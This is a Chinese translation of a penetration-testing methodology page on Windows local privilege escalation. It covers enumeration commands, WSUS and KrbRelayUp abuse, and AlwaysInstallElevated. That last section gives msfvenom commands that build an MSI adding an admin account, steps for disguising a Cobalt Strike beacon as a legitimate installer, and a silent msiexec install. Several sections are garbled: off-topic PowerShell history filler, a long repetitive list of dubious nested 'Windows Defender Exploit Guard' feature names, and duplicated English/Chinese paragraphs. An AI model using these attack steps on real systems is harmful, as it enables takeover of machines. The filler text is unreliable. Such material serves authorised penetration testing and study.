# Windows本地权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

### **查找Windows本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows初始理论

### 访问令牌

**如果你不知道Windows访问令牌是什么，请在继续之前阅读以下页面：**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**如果你不知道本节标题中使用的任何缩写词的含义，请在继续之前阅读以下页面：**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完整性级别

**如果你不知道Windows中的完整性级别是什么，请在继续之前阅读以下页面：**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows安全控制

在Windows中，有不同的东西可能会**阻止你枚举系统**，运行可执行文件，甚至**检测到你的活动**。在开始权限提升枚举之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御** **机制**：

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## 系统信息

### 版本信息枚举

检查Windows版本是否存在已知漏洞（还要检查应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞

这个[网站](https://msrc.microsoft.com/update-guide/vulnerability)非常方便，可以搜索到有关微软安全漏洞的详细信息。该数据库中有超过4,700个安全漏洞，显示了Windows环境所面临的**巨大攻击面**。

**在系统上**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas已嵌入watson)_

**本地系统信息**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**漏洞的Github仓库：**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

环境变量中保存了任何凭据/敏感信息吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell 历史

PowerShell 是一种任务自动化和配置管理框架，它最初是为 Windows 开发的。它提供了一个强大的命令行界面，可以让用户执行各种任务，包括系统管理、网络管理和安全审计等。PowerShell 的历史可以追溯到 2006 年，当时微软发布了第一个版本的 PowerShell。

PowerShell 的设计目标是提供一种易于使用和理解的脚本语言，同时具备强大的功能和灵活性。它采用了类似于 Unix shell 的命令行语法，但提供了更多的功能和扩展性。PowerShell 还支持使用 .NET Framework 和其他编程语言编写的脚本，使用户能够利用现有的代码库和工具。

PowerShell 的历史可以分为几个重要的版本。最初的版本是 PowerShell 1.0，它于 2006 年发布。随后，微软陆续发布了 PowerShell 2.0、PowerShell 3.0、PowerShell 4.0、PowerShell 5.0 和 PowerShell 7.0 等版本，每个版本都引入了新的功能和改进。

PowerShell 7.0 是最新的版本，于 2020 年发布。它是一个跨平台的版本，可以在 Windows、Linux 和 macOS 上运行。PowerShell 7.0 引入了许多新功能，包括对新的操作系统版本的支持、改进的性能和安全性，以及更好的与其他脚本语言的集成。

总的来说，PowerShell 是一种功能强大的脚本语言和配置管理框架，它在 Windows 系统中扮演着重要的角色。随着时间的推移，PowerShell 不断发展和改进，为用户提供更好的体验和更多的功能。
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell会话记录文件

您可以在[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)了解如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell模块日志记录

它记录了PowerShell的管道执行细节。这包括执行的命令，包括命令调用和一些脚本的部分。它可能没有完整的执行细节和输出结果。\
您可以按照上一节（Transcript文件）的链接启用此功能，但是要启用“模块日志记录”而不是“PowerShell记录”。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看最后15个PowerShell日志事件，可以执行以下命令：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **脚本块日志记录**

它记录代码块在执行时的情况，因此可以捕获脚本的完整活动和内容。它维护每个活动的完整审计跟踪，可以在取证和研究恶意行为时使用。它记录执行时的所有活动，因此提供了完整的详细信息。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
脚本块日志事件可以在Windows事件查看器中找到，路径如下：_应用程序和服务日志 > Microsoft > Windows > Powershell > 操作_\
要查看最近的20个事件，可以使用以下命令：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 网络设置

#### Internet Explorer Enhanced Security Configuration (IE ESC)

Internet Explorer Enhanced Security Configuration (IE ESC) 是一种 Windows 功能，旨在增强 Internet Explorer 浏览器的安全性。它限制了对 Internet 和本地 Intranet 网站的访问，并将安全性设置提高到较高的级别。IE ESC 默认情况下在 Windows Server 上启用，但在 Windows 客户端上禁用。

#### Windows Firewall

Windows 防火墙是一种网络安全功能，用于监控和控制进入和离开计算机的网络流量。它可以阻止未经授权的访问和恶意软件的传播。Windows 防火墙可以配置为允许或阻止特定应用程序或端口的访问。

#### User Account Control (UAC)

用户账户控制 (UAC) 是一种 Windows 安全功能，用于限制标准用户对计算机系统的更改。当需要进行系统级更改时，UAC 会提示用户提供管理员凭据。UAC 可以帮助防止未经授权的更改和恶意软件的运行。

#### Windows Defender

Windows Defender 是 Windows 操作系统的内置防病毒和反恶意软件解决方案。它可以实时监测和阻止恶意软件的入侵，并提供定期的病毒扫描和系统保护。

#### Windows Update

Windows Update 是 Windows 操作系统的自动更新服务。它可以下载和安装操作系统的安全补丁和更新，以提供最新的安全性和功能改进。

#### Remote Desktop

远程桌面是一种 Windows 功能，允许用户从远程位置访问和控制其他计算机。为了增强安全性，应禁用远程桌面功能，除非有必要使用它。

#### Services

Windows Services 是在后台运行的应用程序或进程，提供操作系统的功能和功能。为了增强安全性，应禁用不需要的服务，并限制对敏感服务的访问。

#### Registry

Windows 注册表是存储操作系统和应用程序设置的数据库。为了增强安全性，应限制对注册表的访问，并禁用不必要的功能和设置。

#### File and Folder Permissions

文件和文件夹权限是控制用户对文件和文件夹的访问权限的设置。为了增强安全性，应正确配置文件和文件夹的权限，并限制对敏感文件和文件夹的访问。

#### Group Policy

组策略是一种 Windows 功能，用于管理计算机和用户的配置设置。通过组策略，可以强制实施安全策略和限制对系统资源的访问。

#### Audit Policies

审计策略是一种 Windows 功能，用于监视和记录系统事件和活动。通过配置审计策略，可以检测和跟踪潜在的安全问题和入侵行为。

#### Account Policies

账户策略是一种 Windows 功能，用于管理用户账户的安全性设置。通过配置账户策略，可以强制实施密码复杂性要求、账户锁定策略等安全措施。

#### Secure Boot

Secure Boot 是一种 UEFI (统一固件接口) 功能，用于保护计算机免受恶意软件的攻击。它确保只有经过数字签名的操作系统和启动加载程序才能运行。

#### BitLocker

BitLocker 是一种 Windows 功能，用于对硬盘驱动器进行加密保护。它可以防止未经授权的访问和数据泄露。

#### AppLocker

AppLocker 是一种 Windows 功能，用于限制用户对特定应用程序和脚本的访问。通过配置 AppLocker，可以防止恶意软件的运行和未经授权的应用程序的使用。

#### Device Guard

Device Guard 是一种 Windows 功能，用于保护计算机免受未经授权的应用程序和脚本的攻击。它使用硬件和软件的安全功能来确保只有经过信任的应用程序才能运行。

#### Credential Guard

Credential Guard 是一种 Windows 功能，用于保护用户凭据免受恶意软件的攻击。它使用硬件和软件的安全功能来隔离和保护用户凭据。

#### Windows Hello

Windows Hello 是一种 Windows 功能，用于提供多种身份验证方法，如指纹、面部识别和虹膜扫描。它可以增强用户账户的安全性。

#### Windows Defender Application Guard

Windows Defender Application Guard 是一种 Windows 功能，用于在浏览器中隔离和保护用户免受恶意软件的攻击。它使用虚拟化技术来隔离浏览器会话和系统。

#### Windows Sandbox

Windows Sandbox 是一种 Windows 功能，用于在隔离的环境中运行不受信任的应用程序。它可以防止恶意软件的传播和系统的受损。

#### Windows Defender Exploit Guard

Windows Defender Exploit Guard 是一种 Windows 功能，用于防止和检测恶意软件的攻击。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Credential Guard

Windows Defender Credential Guard 是一种 Windows 功能，用于保护用户凭据免受恶意软件的攻击。它使用硬件和软件的安全功能来隔离和保护用户凭据。

#### Windows Defender Application Control

Windows Defender Application Control 是一种 Windows 功能，用于限制可运行的应用程序和脚本。它使用应用程序白名单和黑名单来防止未经授权的应用程序的运行。

#### Windows Defender System Guard

Windows Defender System Guard 是一种 Windows 功能，用于保护计算机免受恶意软件的攻击。它使用硬件和软件的安全功能来确保系统的完整性和安全性。

#### Windows Defender Firewall with Advanced Security

Windows Defender Firewall with Advanced Security 是一种 Windows 功能，用于监控和控制网络流量。它提供了高级的防火墙功能，如入站和出站规则的配置。

#### Windows Defender Antivirus

Windows Defender Antivirus 是一种 Windows 功能，用于检测和阻止恶意软件的入侵。它提供了实时的病毒扫描和保护功能。

#### Windows Defender SmartScreen

Windows Defender SmartScreen 是一种 Windows 功能，用于阻止恶意软件和欺诈网站的访问。它可以在用户访问不安全的网站或下载不安全的文件时发出警告。

#### Windows Defender Device Guard

Windows Defender Device Guard 是一种 Windows 功能，用于保护计算机免受未经授权的应用程序和脚本的攻击。它使用硬件和软件的安全功能来确保只有经过信任的应用程序才能运行。

#### Windows Defender Advanced Threat Protection

Windows Defender Advanced Threat Protection 是一种 Windows 功能，用于检测和响应高级威胁。它提供了实时的威胁情报和威胁响应功能。

#### Windows Defender Security Center

Windows Defender Security Center 是一种 Windows 功能，用于管理和监控计算机的安全性。它提供了集中的安全管理和报告功能。

#### Windows Defender Exploit Protection

Windows Defender Exploit Protection 是一种 Windows 功能，用于防止和检测恶意软件的攻击。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Device Health Attestation

Windows Defender Device Health Attestation 是一种 Windows 功能，用于评估计算机的健康状况。它可以检测和报告潜在的安全问题和配置错误。

#### Windows Defender Application Guard Companion

Windows Defender Application Guard Companion 是一种 Windows 功能，用于在浏览器中隔离和保护用户免受恶意软件的攻击。它使用虚拟化技术来隔离浏览器会话和系统。

#### Windows Defender Browser Protection

Windows Defender Browser Protection 是一种浏览器扩展，用于阻止恶意软件和欺诈网站的访问。它可以在用户访问不安全的网站时发出警告。

#### Windows Defender Application Control Policies

Windows Defender Application Control Policies 是一种 Windows 功能，用于限制可运行的应用程序和脚本。它使用应用程序白名单和黑名单来防止未经授权的应用程序的运行。

#### Windows Defender Exploit Guard Attack Surface Reduction

Windows Defender Exploit Guard Attack Surface Reduction 是一种 Windows 功能，用于减少系统的攻击面。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Network Protection

Windows Defender Exploit Guard Network Protection 是一种 Windows 功能，用于防止网络攻击。它可以检测和阻止恶意软件的入侵。

#### Windows Defender Exploit Guard Controlled Folder Access

Windows Defender Exploit Guard Controlled Folder Access 是一种 Windows 功能，用于保护敏感文件和文件夹免受恶意软件的攻击。它可以阻止未经授权的应用程序对受保护文件的访问。

#### Windows Defender Exploit Guard Exploit Protection

Windows Defender Exploit Guard Exploit Protection 是一种 Windows 功能，用于防止和检测恶意软件的攻击。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Attack Surface Reduction Rules

Windows Defender Exploit Guard Attack Surface Reduction Rules 是一种 Windows 功能，用于减少系统的攻击面。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Network Protection Rules

Windows Defender Exploit Guard Network Protection Rules 是一种 Windows 功能，用于防止网络攻击。它可以检测和阻止恶意软件的入侵。

#### Windows Defender Exploit Guard Controlled Folder Access Rules

Windows Defender Exploit Guard Controlled Folder Access Rules 是一种 Windows 功能，用于保护敏感文件和文件夹免受恶意软件的攻击。它可以阻止未经授权的应用程序对受保护文件的访问。

#### Windows Defender Exploit Guard Exploit Protection Rules

Windows Defender Exploit Guard Exploit Protection Rules 是一种 Windows 功能，用于防止和检测恶意软件的攻击。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration

Windows Defender Exploit Guard Exploit Protection Configuration 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Rules

Windows Defender Exploit Guard Exploit Protection Configuration Rules 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Profiles

Windows Defender Exploit Guard Exploit Protection Configuration Profiles 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Profile Rules

Windows Defender Exploit Guard Exploit Protection Configuration Profile Rules 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings

Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings Rules

Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings Rules 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。

#### Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings System Rules

Windows Defender Exploit Guard Exploit Protection Configuration Profile System Settings System Rules 是一种 Windows 功能，用于配置防止和检测恶意软件的攻击的设置。它提供了多个安全功能，如应用程序控制、攻击面减少和数据保护。
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器

In Windows, drives are used to store and organize data. Each drive is assigned a letter, such as C:, D:, etc. Drives can be local, meaning they are physically connected to the computer, or they can be network drives, which are accessed over a network connection.

在Windows中，驱动器用于存储和组织数据。每个驱动器都被分配一个字母，例如C：，D：等。驱动器可以是本地的，意味着它们物理连接到计算机，也可以是网络驱动器，通过网络连接访问。
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果使用的是 http 而不是 http**S** 请求更新，您可以入侵系统。

您可以通过运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
如果你收到以下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 等于 `1`。

那么，**它是可利用的**。如果最后一个注册表等于0，则会忽略WSUS条目。

为了利用这些漏洞，您可以使用工具如：[Wsuxploit](https://github.com/pimps/wsuxploit)，[pyWSUS](https://github.com/GoSecure/pywsus) - 这些是用于将“伪造”更新注入非SSL WSUS流量的中间人武器化利用脚本。

在这里阅读研究报告：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**在这里阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。
基本上，这个漏洞利用的是以下缺陷：

> 如果我们有权修改本地用户代理，并且Windows更新使用Internet Explorer设置中配置的代理，那么我们就有权在我们的资产上以提升的用户身份运行[PyWSUS](https://github.com/GoSecure/pywsus)来拦截我们自己的流量并运行代码。
>
> 此外，由于WSUS服务使用当前用户的设置，它还将使用其证书存储。如果我们为WSUS主机名生成自签名证书并将此证书添加到当前用户的证书存储中，我们将能够拦截HTTP和HTTPS的WSUS流量。WSUS不使用类似HSTS的机制来对证书进行首次使用的信任验证。如果所呈现的证书被用户信任并且具有正确的主机名，服务将接受该证书。

您可以使用工具[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)来利用此漏洞（一旦它被释放）。

## KrbRelayUp

这实际上是一个在**未强制执行LDAP签名**的Windows **域**环境中的通用无修复**本地权限提升**，其中用户具有自身权限（用于配置**RBCD**）并且用户可以在域中创建计算机。
所有**要求**都满足**默认设置**。

在[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)中找到**漏洞利用**。

即使攻击是针对更多关于攻击流程的信息，请查看[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果**这两个注册表被**启用**（值为**0x1**），则任何权限的用户都可以将`*.msi`文件安装（执行）为NT AUTHORITY\\**SYSTEM**。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit负载

Metasploit是一款功能强大的渗透测试工具，提供了多种负载（payload）选项，用于在目标系统上执行各种操作。负载是指在攻击过程中要在目标系统上执行的代码或命令。

以下是一些常见的Metasploit负载选项：

- **反向TCP Shell**：创建一个反向TCP连接，允许攻击者通过该连接与目标系统进行交互。
- **反向TCP Meterpreter Shell**：Meterpreter是Metasploit的一个强大工具，提供了丰富的功能和交互性。反向TCP Meterpreter Shell允许攻击者通过Meterpreter与目标系统进行交互。
- **HTTP(S)反向Shell**：创建一个反向HTTP(S)连接，允许攻击者通过该连接与目标系统进行交互。
- **Windows反向TCP Shell**：创建一个反向TCP连接，专门用于Windows系统。
- **Windows反向TCP Meterpreter Shell**：Meterpreter的Windows版本，提供了更多针对Windows系统的功能和交互性。
- **Linux反向TCP Shell**：创建一个反向TCP连接，专门用于Linux系统。
- **Linux反向TCP Meterpreter Shell**：Meterpreter的Linux版本，提供了更多针对Linux系统的功能和交互性。

这些负载选项可以根据具体的攻击需求进行选择和配置。使用Metasploit负载可以实现对目标系统的控制和提升本地权限，从而进行更深入的渗透测试和攻击。
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果您有一个meterpreter会话，可以使用模块**`exploit/windows/local/always_install_elevated`**来自动化此技术。

### PowerUP

使用power-up中的`Write-UserAddMSI`命令，在当前目录中创建一个Windows MSI二进制文件以提升权限。该脚本会写出一个预编译的MSI安装程序，提示添加用户/组（因此您需要GUI访问）：
```
Write-UserAddMSI
```
只需执行创建的二进制文件以提升权限。

### MSI包装器

阅读本教程，了解如何使用此工具创建MSI包装器。请注意，如果您只想执行命令行，可以包装一个 "**.bat**" 文件。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### 使用WIX创建MSI

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### 使用Visual Studio创建MSI

* 使用Cobalt Strike或Metasploit在 `C:\privesc\beacon.exe` 中生成一个新的Windows EXE TCP载荷。
* 打开 **Visual Studio**，选择 **创建新项目**，并在搜索框中键入 "installer"。选择 **Setup Wizard** 项目，然后点击 **下一步**。
* 给项目命名，例如 **AlwaysPrivesc**，使用 **`C:\privesc`** 作为位置，选择 **将解决方案和项目放在同一目录中**，然后点击 **创建**。
* 一直点击 **下一步**，直到进入第4步的第3步（选择要包含的文件）。点击 **添加**，然后选择刚刚生成的Beacon载荷。然后点击 **完成**。
* 在 **解决方案资源管理器** 中突出显示 **AlwaysPrivesc** 项目，在 **属性** 中将 **TargetPlatform** 从 **x86** 更改为 **x64**。
* 还可以更改其他属性，例如 **Author** 和 **Manufacturer**，这样安装的应用程序看起来更合法。
* 右键单击项目，选择 **查看 > 自定义操作**。
* 右键单击 **Install**，然后选择 **添加自定义操作**。
* 双击 **Application Folder**，选择您的 **beacon.exe** 文件，然后点击 **确定**。这将确保在运行安装程序时立即执行Beacon载荷。
* 在 **自定义操作属性** 下，将 **Run64Bit** 更改为 **True**。
* 最后，**构建**它。
* 如果显示警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为x64。

### MSI安装

要在**后台**执行恶意的 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用这个漏洞，你可以使用：_exploit/windows/local/always\_install\_elevated_

## 杀毒软件和检测器

### 审计设置

这些设置决定了什么被**记录**，所以你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（WEF），了解日志发送的位置很有趣。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 允许您在域加入的计算机上**管理本地管理员密码**（该密码是**随机生成**的、唯一的，并且**定期更改**）。这些密码被集中存储在Active Directory中，并使用ACLs限制为授权用户。如果您的用户被赋予足够的权限，您可能能够读取本地管理员的密码。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

如果启用，**明文密码将存储在LSASS**（本地安全性子系统服务）中。\
[**有关WDigest的更多信息，请参阅此页面**](../stealing-credentials/credentials-protections.md#wdigest)。
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA 保护

微软在 **Windows 8.1 及更高版本**中为 LSA 提供了额外的保护，以**防止**不受信任的进程能够**读取其内存**或注入代码。\
[**在此处了解有关 LSA 保护的更多信息**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### 凭据保护

**凭据保护**是Windows 10（企业版和教育版）中的一项新功能，它有助于保护机器上的凭据免受诸如哈希传递等威胁的攻击。\
[**在此处了解有关凭据保护的更多信息。**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### 缓存凭据

**域凭据**由操作系统组件使用，并由**本地安全性机构**（LSA）进行**身份验证**。通常情况下，当注册的安全包验证用户的登录数据时，会为用户建立域凭据。\
[**在此处了解有关缓存凭据的更多信息**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户和组

### 枚举用户和组

您应该检查您所属的任何组是否具有有趣的权限。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果您**属于某个特权组，您可能能够提升权限**。在这里了解特权组以及如何滥用它们来提升权限：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### 令牌操作

在此页面上**了解更多**关于令牌的信息：[**Windows 令牌**](../authentication-credentials-uac-and-efs.md#access-tokens)。\
查看以下页面以**了解有趣的令牌**以及如何滥用它们：

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### 已登录用户 / 会话
```
qwinsta
klist sessions
```
### 主目录

Home folders are directories on a Windows system that are created for each user account. These folders contain personal files, settings, and configurations specific to each user. By default, home folders are located in the `C:\Users` directory.

主目录是在Windows系统上为每个用户帐户创建的目录。这些目录包含每个用户特定的个人文件、设置和配置。默认情况下，主目录位于`C:\Users`目录中。

### User Permissions

### 用户权限

Each user has specific permissions assigned to their home folder. These permissions determine what actions a user can perform within their own folder. By default, a user has full control over their home folder, allowing them to read, write, and execute files within it.

每个用户都有特定的权限分配给他们的主目录。这些权限决定了用户在自己的目录中可以执行哪些操作。默认情况下，用户对自己的主目录拥有完全控制权限，允许他们在其中读取、写入和执行文件。

### Privilege Escalation

### 权限提升

In some cases, it may be possible to escalate privileges by exploiting misconfigurations or vulnerabilities related to home folders. For example, if a user has misconfigured permissions on their home folder, it may be possible for an attacker to gain unauthorized access and modify files within the folder.

在某些情况下，可能可以通过利用与主目录相关的配置错误或漏洞来提升权限。例如，如果用户在其主目录上配置了错误的权限，攻击者可能可以未经授权地访问并修改目录中的文件。

### Mitigation

### 缓解措施

To mitigate the risk of privilege escalation through home folders, it is important to ensure that proper permissions are set for each user's folder. This includes regularly reviewing and updating permissions to prevent unauthorized access.

为了减轻通过主目录进行权限提升的风险，重要的是确保为每个用户的目录设置适当的权限。这包括定期审查和更新权限，以防止未经授权的访问。

Additionally, it is recommended to implement strong password policies and regularly educate users about the importance of maintaining secure passwords. This can help prevent unauthorized access to user accounts and reduce the likelihood of privilege escalation.

此外，建议实施强密码策略，并定期向用户普及维护安全密码的重要性。这可以帮助防止对用户帐户的未经授权访问，并降低权限提升的可能性。
```
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略

